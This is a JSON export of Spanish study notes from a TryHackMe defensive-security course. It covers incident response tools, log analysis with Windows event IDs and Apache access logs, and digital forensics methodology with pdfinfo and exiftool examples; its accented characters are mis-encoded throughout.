    "content": "Recuerda que hemos estudiado la segunda fase del ciclo de respuesta a incidentes: \"Identificaci√≥n\" en SANS y \"Detecci√≥n y An√°lisis\" en NIST. Es muy dif√≠cil mirar a un comportamiento inusual e identificar incidentes manualmente. Hay m√∫ltiples soluciones de seguridad que sirven para su propio rol en la detecci√≥n de incidentes. Algunos tienen la capacidad de responder.\n\n- **SIEM:** La soluci√≥n Security Information and Event Manager (SIEM) recolecta todos los logs importantes en una localizaci√≥n centralizada y los correlaciona con los incidentes.\n- **AV:** El antivirus detecta programas maliciosos conocidos en un sistema con escaneos regulares.\n- **EDR:** Endpoint Detection and Response se despliega en cada sistema, protegi√©ndolo contra algunas amenazas de nivel avanzado. Tambi√©n puede contener y erradicar la amenaza.\n\nDespu√©s de identificar los incidentes, deben seguirse ciertos procedimientos, incluyendo investigar la extensi√≥n del ataque, tomar medidas necesarias para evitar m√°s da√±o y eliminarlo de la ra√≠z. Estos pasos pueden ser diferentes dependiendo del tipo de incidente. En este escenario, tener instrucciones paso a paso para cada incidente ayuda mucho. Estas soluciones se conocen como **playbooks**.\n\nAqu√≠ vemos un ejemplo de playbook:\n\n1. Notificar a todos los interesados del incidente de phishing en email.\n2. Determinar si el email era malicioso realizando an√°lisis de header y body del email.\n3. Buscar cualquier archivo adjunto al email y analizarlo.\n4. Aislar el sistema infectado de la red.\n5. Bloquear al recipiente.\n\nPor otro lado, los **runbooks** son instrucciones paso a paso detalladas sobre pasos espec√≠ficos durante diferentes incidentes. Estos pasos pueden variar en funci√≥n de los recursos dispoonibles para la investigaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Logs Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/0-logs-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/0. Logs Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "[[1. Introduction to Logs]]\n[[2. Types of Logs]]\n[[3. Windows Event Logs Analysis]]\n[[4. Web Server Access Logs Analysis]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Web Server Access Logs Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/4-web-server-access-logs-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/4. Web Server Access Logs Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "Interactuamos con m√∫ltiples sitios web a diario. A veces, s√≥lo queremos ver el sitio web y aveces registrarnos o iniciar sesi√≥n en sus servicios. Esto son dos tipos de peticiones al sitio web. Estas peticiones se guardan en archivos de log en el servidor que corre esa p√°gina.\n\nEste archivo de logs contiene todas las peticiones hechas a la p√°gina web junto con informaci√≥n en el marco de tiempo, la IP que hace la petici√≥n, el tipo de petici√≥n y la URL. Aqu√≠ abajo podemos ver los campos tomados de un log de ejemplo de un servidor web Apache que puede ser encontrado en el directorio: `/var/log/apache2/access.log`.\n\n- **IP Address:** ‚Äú172.16.0.1‚Äù - The IP address of the user who made the request.\n    \n- **Timestamp:** ‚Äú[06/Jun/2024:13:58:44]‚Äù - The time when the request was made to the website.\n    \n- **Request:** The request details.\n    \n    - **HTTP Method:** ‚ÄúGET‚Äù - Tells the website what action to be performed on the request.\n    - **URL:** ‚Äú/‚Äù - The requested resource.\n- **Status Code:** ‚Äú200‚Äù - The response from the server. Different numbers indicate different response results.\n    \n- **User-Agent:** ‚ÄúMozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36‚Äù - Information about the user‚Äôs Operating System, browser, etc. when making the request.\n\nPodemos realizar un an√°lisis manual usando algunas utilidades de l√≠nea de comandos. Los siguientes, son comandos √∫tiles durante un an√°lisis manual:\n\n- `cat`: Sirve para mostrar el l√≠nea de comandos los contenidos de un archivo.\n- `grep`: Sirve para filtrar por cadenas de texto o patrones.\n- `less`: Cuando trabajamos con varias p√°ginas nos permite ver p√°gina a p√°gina. Para avanzar usamos `barra espaciadora` y para volver atr√°s `b`. Si queremos buscar escribimos `/` y `n` para ir a la siguiente concurrencia y `N` a la anterior.\n\n----------------------------\n<h2>Ejercicio</h2>\nAnalizar un documento de logs de acceso web a un servidor:\n\n1. Descargamos el archivo:\n   ![[Pasted image 20251022185121.png]]\n2. Leemos el contenido del archivo:\n   ![[Pasted image 20251022185341.png]]\n3. Como es muy grande empezamos a filtrar:\n   ![[Pasted image 20251022185514.png]]\n4. Filtramos otra vez:\n   ![[Pasted image 20251022185645.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Windows Event Logs Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/3-windows-event-logs-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/3. Windows Event Logs Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "Como otros sistemas operativos, Windows OS tambi√©n registra muchas de las actividades que toman lugar. Estos se almacenan en archivos de log segregados, cada uno con una categor√≠a. Algunos de los tipos de logs cruciales son:\n\n- **Aplicaciones:** Hay muchas aplicaciones correndo en el sistema operativo. Cualquier informaci√≥n relacionada con estas aplicaciones se registra en este archivo.\n- **Sistema:** El sistema operativo tiene diferentes operaciones corriendo. Cualquier informaci√≥n relacionada con estas operacioness se registra en este archivo.\n- **Seguridad:** Es el archivo de log m√°s importante de Windows. Registra cualquier actividad relacionada con la seguridad.\n\nA parte de estos, muchos otros archivos de log en Windows est√°n dise√±ados para registrar actividades relacionadas a acciones y aplicaciones espec√≠ficas .\n\nAl contrario que otros archivos de log estudiados en las teras anteriores, Windows tiene una utilidad llamada Event Viewer, que nos da una interfaz gr√°fica para ver y buscar logs.\n\nPara abrirlo, hacemos click en el bot√≥n de Windows y escribimos 'Event Viewer' y abrir√° el Visor de Eventos. La parte en amarillo muestra los diferentes logs disponibles.\n\n![[Pasted image 20251022164251.png]]\n\nSi haces click en `Windows Logs`, ver√°s los diferentes tipos de logs que hemos visto al comienzo de la actividad. La primera porci√≥n resaltada muestra los diferentes tipos de logs. Cuando hacemos click en uno de ellos, veremos los diferentes logs, como se ve en la segunda parte resaltada. Finalmente, en la tercera porci√≥n tenemos diferentes opciones de an√°lisis de logs.\n\n![[Pasted image 20251022165814.png]]\n\nVeamos el contenido de alguno de ellos:\n\n![[Pasted image 20251022165832.png]]\n\nAs√≠ es como un log de evento se ve en Windows. Tiene diferentes campos, pero veremos los siguientes:\n\n- **Description:** Este campo tiene informaci√≥n detallada de la actividad.\n- **Log Name:** Indica el nombre del archivo log.\n- **Logged:** Indica la hora de la actividad.\n- **Event ID:** Los IDs de eventos son identificadores √∫nicos de una actividad espec√≠fica.\n\nNumerosos IDs de evento est√°n disponibles en los logs de eventos de Windows. Podemos usar estos IDs para buscar cualquier actividad en espec√≠fico. Por ejemplo, el evento ID 4624 identifica una actividad de inicio de sesi√≥n exitoso, por lo que s√≥lo necesitamos buscar 4624 al investigar un inicio de sesi√≥n exitoso.\n\nAqu√≠ hay una tabla de IDs de eventos importantes:\n\n| Event ID | Description                                           |\n| -------- | ----------------------------------------------------- |\n| 4624     | Un usuario ha iniciado sesi√≥n de forma exitosa.       |\n| 4625     | Un usuario ha fallado el intento de inicio de sesi√≥n. |\n| 4634     | Una cuenta de usuario se cerr√≥ exitosamente.          |\n| 4720     | Una cuenta de usuario fue creada.                     |\n| 4724     | Se intent√≥ resetear la contrase√±a de un usuario.      |\n| 4722     | Se habilit√≥ una cuenta de usuario.                    |\n| 4725     | Se deshabilit√≥ una cuenta de usuario.                 |\n| 4726     | Se borr√≥ una cuenta de usuario.                       |\nHay muchos m√°s IDs de eventos. No es necesario recordarlos todos pero es bueno conocer algunos clave.\n\nEl visor de eventos nos permite buscar entre los logs relacionados a un ID de evento espec√≠fico con la funcionalidad `Filter Current Log`. Podemos hacer click en esta funcionalidad para aplicar cualquier filtro:\n\n![[Pasted image 20251022175353.png]]\n\nCuando hacemos click en `Filter Current Log`, se nos pedir√° ingressar el ID de evento que queremos filtrar. Aqu√≠ debajo un ejemplo del filtrado por ID `4624`:\n\n![[Pasted image 20251022175549.png]]\n![[Pasted image 20251022175603.png]]\n\n------------------------------\n<h2>Ejercicio</h2>\nEl viernes, una rganizaci√≥n cr√≠tica report√≥ haber sido v√≠ctima de un ciberataque. En la investigaci√≥n se encontr√≥ que informaci√≥n cr√≠tica fue exfiltrada de un servidor de archivos de la red de la organizaci√≥n. El equipo de seguridad determin√≥ exitosamente el nombre y la IP del usuario del sistema comprometido en la red, que tuvo acceso a dicho servidor.\n\nTu trabajo es investigar y encontrar las actividades del atacante en este sistema comprometido antes de que ganase acceso al servidor.\n\n1. Entramos en la m√°quina por `xfreerdp3`:\n   ![[Pasted image 20251022181211.png]]\n   ![[Pasted image 20251022181536.png]]\n2. Entramos en el Event Viewer:\n   ![[Pasted image 20251022181658.png]]\n3. Buscamos por c√≥digo 4720 para ver las cuentas creadas:\n   ![[Pasted image 20251022181848.png]]\n4. Pinchamos en la √∫ltima creada y miramos el nombre de usuario de la nueva cuenta:\n   ![[Pasted image 20251022182049.png]]\n5. Miramos qui√©n cre√≥ la cuenta:\n   ![[Pasted image 20251022182131.png]]\n6. Miramos cu√°ndo se activ√≥ la cuenta:\n   ![[Pasted image 20251022182321.png]]\n7. Filtramos por c√≥digo `4724` parra ver intentos de cambios de contrase√±a:\n   ![[Pasted image 20251022182632.png]]\n8. Vemos que efectivamente s√≠ que se cambi√≥:\n   ![[Pasted image 20251022182714.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Types of Logs",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/2-types-of-logs/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/2. Types of Logs.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "En la tarea anterior hemos visto varios casos de uso de los logs. Esto es un reto, imagina que tienes que investigar un problema con un sistema a trav√©s de logs. Abres el archivo de logs del sistema y te abruma la cantidad de logs que hay.\n\nAqu√≠ esta la soluci√≥n: Los logs se segregan en diferentes categor√≠as dependiendo del tipo de informaci√≥n  que ofrecen. As√≠ que ahora ya s√≥lo tienes que mirar dentro del archivo log espec√≠fico para el que el problema se relaciona. Veamos algunos tipos:\n\n| Tipo de Log      | Uso                                                                                                                                      |\n| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |\n| System Logs      | √ötiles en la resoluci√≥n de problemas. Ofrecen informaci√≥n de varias actividades del sistema operativo.                                   |\n| Security Logs    | Ayudan a detectar e investigar incidentes. Estos logs ofrecen informaci√≥n sobre actividades relacionadas con la seguridad en el sistema. |\n| Application Logs | Los logs de aplicaci√≥n contienen eventos espec√≠ficos relacionados con la aplicaci√≥n.                                                     |\n| Audit Logs       | Ofrecen informaci√≥n detallada sobre los cambios del sistema y eventos de usuario.                                                        |\n| Network Logs     | Ofrecen informaci√≥n sobre el tr√°fico entrante y saliente de la red.                                                                      |\n| Access Logs      | Ofrecen informaci√≥n detellada sobre el acceso a difrentes recursos.                                                                      |\n\n>[!NOTE] Puede haber muchos m√°s tipos de logs dependiendo en el servicio y en la aplicaci√≥n que sirve.\n\nAhora que ya entendemos qu√© son esstos logs y c√≥mo varios tipos de logs pueden ser √∫tiles en diferentes escenarios, veamos c√≥mo podemos analizar estos logs para extraer la informaci√≥n requerida de ellos. Como hacer el an√°lisis es extremadamente complicado para el ojo humano, contamos con herramientas manuales y autom√°ticas para hacerlo posible.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Logs",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/5-logs-fundamentals/1-introduction-to-logs/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/5. Logs Fundamentals/1. Introduction to Logs.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 5. Logs Fundamentals",
    "content": "Los atacantes son inteligentes. Para evitar ser detectados evitan dejar rastros en el lado de la v√≠ctima. A√∫n as√≠, el quipo de seguridad determina c√≥mo se ejecut√≥ el ataque y a veces resulta exitoso en averiguar qui√©n est√° detr√°s del ataque.\n\nEn un caso real de investigaci√≥n de polic√≠a, las pistas juegan un papel fundamental en la resoluci√≥n del caso. Pero y en el mundo digital, ¬ød√≥nde se encuentran esas pistas y rastros? Hay varios sitios en un sistema donde pueden quedar registrados losgs o rastros. Los logs son las huellas del mundo digital. Seguir el rastro del la actividad y saber que usuario hizo qu√© cosa es posible gracias a los logs.\n\n-----------------------------\n<h2>Casos de Uso</h2>\nAqu√≠ vemos algunas areas clave donde los logs juegan un rol integral:\n\n| Caso de Uso                          | Descripci√≥n                                                                                                      |\n| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |\n| Security Events Monitoring           | Los logs nos ayudan a detectar comportamiento inusual cuando usamos monitorizaci√≥n en tiempo real.               |\n| Incident Investigation and Forensics | Los logs son los rastros detr√°s de cada indicio. Ofrecen informaci√≥n detallada de qu√© pas√≥ durante el incidente. |\n| Troubleshooting                      | Como los logs tambi√©n recogen errores de sistema o aplicaciones, pueden usarse para resolver problemas.          |\n| Performance Monitoring               | Pueden ofrecer una vista valiosa dentro de las aplicaciones de rendimiento.                                      |\n| Auditing and Compliance              | Juegan un rol importante en la auditor√≠a y cumplimiento legal.                                                   |\n\n------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nDespu√©s de completar esta unidad habr√°s aprendido lo siguiente:\n\n- Los diferentes tipos de logs.\n- C√≥mo analizar logs.\n- Analizar Logs de Eventos en Windows.\n- Analizar Logs de Acceso Web.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Digital Forensics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/1-introduction-to-digital-forensics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/1. Introduction to Digital Forensics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "La for√©nsica es la aplicaci√≥n de m√©todos y procedimientos para investigar y resolver cr√≠menes. La rama de la forense que investiga el cibercr√≠men se conoce como for√©nsica digital. El cibercr√≠men es cualquier actividad llevada a cabo en cualquier dispositivo digital. Varias herraminetas se utilizan para investigar los dispositivos digitales despu√©s de un cr√≠men para encontrar y analizar las pruebas para cualquier acci√≥n legal necesaria.\n\nLos dispositivos digitales han resuelto muchos de nuestros problemas. A parte de resolver problemas, debido al incremento de dispositivos digitales tambi√©n se ha visto una subida de los cr√≠menes digitales.\n\nConsideremos un ejemplo donde los cuerpos de seguridad del estado allanan la casa de un ladr√≥n de bancos con los correspondientes permisos de registro. Algunos dispositivos digitales, incluyendo un port√°til, un m√≥vil un disco duro y un USB, han sido hallados en su casa. El equipo de forense llev√≥ a cabo una investigaci√≥n a fondo en su laboratorio, equipado con herramientas de forense. Se encontr√≥ la siguiente evidencia.\n\n- Un mapa del banco se encontr√≥ en el port√°til del sospechoso.\n- Un documento con las rutas de entrada y escape del banco se encontr√≥ en su disco duro.\n- Un documento en el disco duro que listaba todos los controles de seguridad f√≠sicos del banco.\n- Algunos archivos, inclu√≠das fotos y v√≠deos de los robos anteriores del sospechoso, dentro del port√°til.\n- Algunos chats de grupo ilegales y registros de llamada relativos al robo del banco en el m√≥vil del sujeto.\n\nToda esta evidencia ayud√≥ a los cuerpos de seguridad en el proceso legal del caso. Este escenario discute un caso de principio a final. Algunos procedimientos son seguidos por el equipo de for√©nsica digital mientras recolectan la evidencia, la almacenan, la analizan y la reportan.\n\n-------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Fases de la for√©nsica digital.\n- Tipos de for√©nsica digital.\n- Procedimiento de la adquisici√≥n de evidencia.\n- For√©nsica de Windows.\n- Resolviendo un caso de for√©nsica digital.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Digital Forensics Methodology",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/2-digital-forensics-methodology/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/2. Digital Forensics Methodology.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "El equipo de for√©nsica digital tiene varios casos requiriendo herramientas y t√©cnicas diferentes. Sin embargo, el Instituto Nacional de Est√°ndares y Tecnolog√≠a (NIST) define un proceso general para cada caso. ELl NIST funciona definiendo frameworks para diferentes areas de la tecnolog√≠a, incluyendo la ciberseguridad, donde introducen el proceso de la for√©nsica digital en cuatro fases.\n\n![[Pasted image 20251020172734.png]]\n\n1. **Recopilaci√≥n:** La primera fase de la for√©nsica digital es la recopilaci√≥n de informaci√≥n. Identificar todos los dispositivos de los que se puede recopilar informaci√≥n es clave. Usualmente un investigador encuentra port√°tiles, m√≥viles, c√°maras digitales, discos duros USBs, etc.\n2. **Examinaci√≥n:** La informaci√≥n recolectada puede intimidar a los investigadores debido a su tama√±o. Esta, usualmente necesita ser filtrada para extraer la informaci√≥n relevante.\n3. **An√°lisis:** Esta es la fase cr√≠tica. Los investigadores tienen que analizar la informaci√≥n correlacion√°ndola con varias piezas de evidencia para sacar conclusiones. El an√°lisis busca extraer las actividades relevantes para la cronolog√≠a del caso.\n4. **Reporte:** En la √∫ltima fase, se prepara un informe detallado. Este contiene la metodolog√≠a y hallazgos detallados de la informaci√≥n recolectada. El informe se presenta a la autoridad competente y se deja en sus manos.\n\nComo parte de la fase de recolecci√≥n, vimos que varias piezas de evidencia puede ser encontradas en la escena del cr√≠men. Analicar estas m√∫ltiples categor√≠as de evidencia requiere varias herramientas y t√©cnicas. Hay diferentes tipos de for√©nsica digital, todo con sus propias metodolog√≠as de recolecci√≥n y an√°lisis. Algunos de los tipos m√°s comunes son:\n\n- **Computer Forensics:** El tipo m√°s com√∫n de for√©nsica digital es la for√©nsica de ordenadores, que concierne investigar ordenadores, los dispositivos m√°s com√∫nmente usados en los cibercr√≠menes.\n- **Mobile Forensics:** Concierne investigar los dispositivos m√≥viles y extraer evidencia como registros de llamada, mensajes de texto, localizaci√≥n GPS y m√°s.\n- **Database Forensics:** Cubre la investigaci√≥n m√°s all√° de los dispositivos individuales. Incluye la red completa. La mayor√≠a de la evidencia recolectada de esta son logs de tr√°fico web.\n- **Cloud Forensics:** Involucra investigar informaci√≥n guardada en la nube. Puede ser peliagudo para los investigadores.\n- **Email Forensics:** El m√©todo de comunicaci√≥n m√°s com√∫n entre profesionales. Los emails se investigan para determinar si son phishing o no.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Practical Example of Digital Forensics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/5-practical-example-of-digital-forensics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/5. Practical Example of Digital Forensics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "Cuando creas un archivo de texto, `TXT`, se guarda cierta informaci√≥n en el sistema operativo, como la fecha de creaci√≥n y la fecha de la √∫ltima modificaci√≥n. Sin embargo, muchos metadatos se quedan guardados en el documento si usas un editor m√°s avanzado como MS Word. Hay varias formas de leer los metadatos de un archivo. Exportar el archivo a otro formato, como `PDF`, mantendr√≠a la mayor√≠a de los metadatos, dependiendo del PDF writer usado.\n\nVeamos lo que podemos aprender de un archivo PDF. Podemos tratar de leer los metadatos usando el programa `pdfinfo`. Este muestra varios metadatos relacionados con el archivo, como t√≠tulo, asunto, autor, creador y fecha de creaci√≥n. Puedes instalar `pdfinfo` con: `sudo apt install poppler-utils`. Considera el siguiente ejemplo:\n\n```shell\nroot@tryhackme:~# pdfinfo DOCUMENT.pdf  \n\tCreator:        Microsoft¬Æ Word for Office 365 \n\tProducer:       Microsoft¬Æ Word for Office 365 \n\tCreationDate:   Wed Oct 10 21:47:53 2018 EEST \n\tModDate:        Wed Oct 10 21:47:53 2018 EEST \n\tTagged:         yes \n\tUserProperties: no \n\tSuspects:       no \n\tForm:           none \n\tJavaScript:     no \n\tPages:          20 \n\tEncrypted:      no \n\tPage size:      595.32 x 841.92 pts (A4) \n\tPage rot:       0 \n\tFile size:      560362 bytes \n\tOptimized:      no \n\tPDF version:    1.7\n```\n\nLos metadatos muestran claramente que fue creado usando MS Word para Office 365 el 10 de Octubre de 2018.\n\n------------------------------------\n<h2>Datos EXIF de una foto</h2>\nEXIF significa Exchangeable Image File Format; es un est√°ndar para guardar metadatos en im√°genes. Cuando tomas una foto con tu tel√©fono m√≥vil o tu c√°mara digital, mucha informaci√≥n se incrusta en la imagen. Algunos ejemplos de esos metadatos son:\n\n- Modelo de la c√°mara/m√≥vil.\n- Fecha y hora de la captura de la imagen.\n- Configuraciones de fotograf√≠a como la distancia focal, apertura, velocidad de obturaci√≥n e ISO.\n\nGracias a que los m√≥viles est√°n equipados con un sensor GPS, encontrar coordenadas GPS incrustadas en la imagen es altamente probable. Las coordenadas GPS como latitud y longitud mostrar√≠an d√≥nde fue tomada la foto.\n\nHay bastantes herramientas online y offline para leer datos EXIF de una imagen. Una de CLI es `exiftool`. Se usa para leer y escribir metadatos en varios tipos de archivos como im√°genes JPEG. Si necesitas instalar esta herramienta: `sudo apt install libimage-exiftool-perl`. Veamos un ejemplo:\n\n```shell\nroot@tryhackme:~# exiftool IMAGE.jpg \n[...] \nGPS Position : 51 deg 31' 4.00\" N, 0 deg 5' 48.30'' W \n[...]\n```\n\nSi quieres buscar estas coordenadas en maps debes sustituir `deg` por `¬∫`. `51 deg 30' 51.90\" N, 0 deg 5' 38.73\" W` -> `51¬∞30'51.9\"N 0¬∞05'38.7\"W`.\n\n-----------------------\n<h2>Challenge</h2>\n1. Investigamos con `pdfinfo` la carta de rescate para conocer al autor:\n   ![[Pasted image 20251020222909.png]]\n2. Con `exiftool` investigamos las coordenadas de la foto del secuestro:\n   ![[Pasted image 20251020223053.png]]\n   ![[Pasted image 20251020223327.png]]\n3. As√≠ tambi√©n podemos ver el modelo de la c√°mara, que aparece arriba.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Evidence Acquisition",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/3-evidence-acquisition/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/3. Evidence Acquisition.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "Adquirir evidencia es una tarea cr√≠tica. El quipo de forense debe recolectar toda la evidencia de manera segura sin interferir con la informaci√≥n original. Los m√©todos de adquisici√≥n de evidencia para dispositivos digitaless depende del tipo de dispositivo digital. Sin embargo, algunas pr√°cticas generales deben seguirse mientras se adquiere la evidencia. Veamos algunos de los m√°s importantes.\n\n---------------------------\n<h2>Autorizaci√≥n Debida</h2>\nEl qeuipo de forense deber√≠a obtener la autorizaci√≥n pertinente de las autoridades relevantes antes de recopilar cualquier informaci√≥n. La evidencia recolectada sin aprovaci√≥n previa puede y ser√° desestimada en la corte. La evidencia for√©nsica contiene informaci√≥n sensible y privada de una organizaci√≥n o individuo. Por esto la correcta y debida autorizaci√≥n es esencial y necesaria para poder investigar los dispositivos.\n\n------------------------------\n<h2>Cadena de Custodia</h2>\nImagina que un equipo de investigadores recolecta toda la evidencia de la escena de un cr√≠men y alguna de las pruebas se extrav√≠a a los pocos d√≠as o hay alg√∫n cambio en la evidencia. Ning√∫n individuo puede ser culpado porque no hay un proceso adecuado de documentaci√≥n de duen√±os de evidencias. Este problema puede ser resuelto manteniendo un documento de cadena de custodia. Es un documento formal que contiene todos los detalles de la evidencia:\n\n- Descripci√≥n de la evidencia.\n- Nombre de los individuos que recolectaron la evidencia.\n- D√≠a y hora de la recolecci√≥n de la evidencia.\n- Lugar de almacenamiento de cada pieza de evidencia.\n- Horas de acceso e individuo que accede a la evidencia.\n\nEsto crea un debido rastreo de evidencia y ayuda a preservar las pruebas. Puede ser usado para probar la integridad y confianza de la evidencia presentada en la corte. Puedes ver un ejemplo de Chain of Custody en el archivo siguiente.\n\n-----------------------------\n<h2>Uso de Bloqueadores de Escritura</h2>\nLos bloqueadores de escritura son una parte esencialde la caja de herramientas del equipo de for√©nsica digital. Sup√≥n que est√°s recolectando evidencia del disco duro de un sospechoso. Mientras la recolecci√≥n toma lugar, algunas tareas en el background pueden alterar los timestamps de los archivos en el hard drive. Esto puede conllevar a obst√°culos en la investigaci√≥n. Es por esto que se utilizan los write blockers.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Digital Forensics Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/0-digital-forensics-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/0. Digital Forensics Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "[[1. Introduction to Digital Forensics]]\n[[2. Digital Forensics Methodology]]\n[[3. Evidence Acquisition]]\n[[4. Windows Forensics]]\n[[5. Practical Example of Digital Forensics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Windows Forensics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/4-windows-forensics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/4. Windows Forensics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "El tipo m√°s com√∫n de evidencia recolectada de las escenas de cr√≠men son PCs de escritorio y port√°tiles, ya que la mayor√≠a de cr√≠men incumbe un sistema personal. Estos dispositivos tienen diferentes sistemas operativos corriendo en ellos. En esta tarea veremos la adquisici√≥n de evidencia y el an√°lisis de sistemas operativos Windows, que es un sistema operativo muy com√∫n que ha sido investigada en varios casos.\n\nComo parte de la fase de recolecci√≥n, se toman im√°genes del sistema operativo Windows. Estas im√°genes forenses son copias bit a bit del sistema operativo entero. Se toman dos categor√≠as de im√°genes forenses en los sistemas operativos Windows.\n\n- **Imagen de Disco:** La imagen de disco contiene toda la informaci√≥n presente en el almacenamiento del dispositivo del sistema (HDD, SDD, etc.). Esta informaci√≥n no es vol√°til, lo que significa que sobrevivir√≠a incluso si se apagara el dispositivo.\n- **Imagen de Memoria:** Contiene la informaci√≥n dentro de la RAM del sistema operativo. Esta memoria es vol√°til, lo que significa que la informaci√≥n se perder√≠a si se apagase el dispositivo. Por ejemplo procesos, archivos abiertos, redes conectadas, etc. Esta im√°gen tiene prioridad sobre la otra.\n\nVeamos algunas herramientas populares usadas para estos dos tipos de de imagen:\n\n- **FKT Imager:** Es una herramienta ampliamente usada para tomar im√°genes de disco de Windows. Ofrece una interfaz gr√°fica de usuario amigable. Puede analizar los contenidos de una imagen de disco. Puede ser usado para adquisici√≥n o an√°lisis.\n- **Autopsy:** [Autopsy](https://www.autopsy.com/) es una plataforma de forense digital de c√≥digo abierto. Un investigador puede importar cualquier imagen de disco adquirida a esta herramienta y esta realizar√° un examen extensivo de esta. Ofrece funcionalidades valiosas durante el an√°lisis de la imagen, incluyendo la b√∫squeda del teclado, archivos borrados, metadatos de archivos, detecci√≥n de extensiones incorrectas y mucho m√°s.\n- **DumpIt:** [DumpIt](https://www.toolwar.com/2014/01/dumpit-memory-dump-tools.html) ofrece la utilidad de tomar im√°genes de memoria de un sistema operativo Windows. Esta herramienta crea una imagen de memoria usando una interfaz de l√≠nea de comandos y unos pocos comandos. La imagen de la memoria puede tomarse en diferentes formatos.\n- **Volatility:** [Volatility](https://volatilityfoundation.org/) es una herramienta de c√≥digo abierto poderosa para analizar im√°genes de memoria. Ofrece plugins extremadamente √∫tiles. Cada artefacto puede ser analizado usando un plugin espec√≠fico. Esta herramienta soporta varios sistemas operativos, como Windows, Linux, macOS y Android.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Defensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/1-defensive-security-intro/0-defensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/1. Defensive Security Intro/0. Defensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 1. Defensive Security Intro",
